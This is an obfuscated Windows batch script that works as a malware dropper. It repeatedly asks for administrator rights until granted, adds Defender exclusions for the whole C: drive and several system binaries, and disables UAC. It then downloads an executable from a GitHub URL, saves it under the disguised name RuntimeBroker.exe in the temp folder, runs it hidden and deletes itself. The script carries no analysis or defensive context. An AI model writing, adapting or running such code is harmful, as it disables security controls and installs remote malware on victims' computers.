@echo off & setlocal enableDelayedExpansion
set "vVCnS=NET" & set "xOJEy=2>&1" & set "bYsd=SESSION" & set "yBAy=>nul"
%vVCnS% %bYsd% %yBAy% %xOJEy%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "ENA=qux" & set "QYsR=bar" & set "WAQjJ=foo" & set "QWEW=baz" & rem fekZR UXSkj CzIbZ
set "tDh=powershell -ExecutionPolicy Bypass -Command"
set "Jjy=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "wMIMu='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "Pnp='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!tDh! "!Jjy! !wMIMu! !Pnp!" %yBAy% %xOJEy%
set "ruJK=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "MRIb=-Name 'EnableLUA' -Value 0"
!tDh! "!ruJK! !MRIb!" %yBAy% %xOJEy%
set "hBMm=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!tDh! "!hBMm!" %yBAy% %xOJEy%
if !errorlevel! neq 0 (goto %a%)
set "viA=timeout /t" & !viA! 2 %yBAy% %xOJEy%
set "LcW=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "fWZ=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "ZWG=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!tDh! "!LcW! !fWZ! !ZWG!" %yBAy% %xOJEy%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!viA! 1 %yBAy% %xOJEy% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %yBAy% %xOJEy%
del /f /q "%~f0" %yBAy% %xOJEy%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %yBAy% %xOJEy%
if !errorlevel! neq 0 (!viA! 3 %yBAy% %xOJEy% & goto %b%)
exit /b
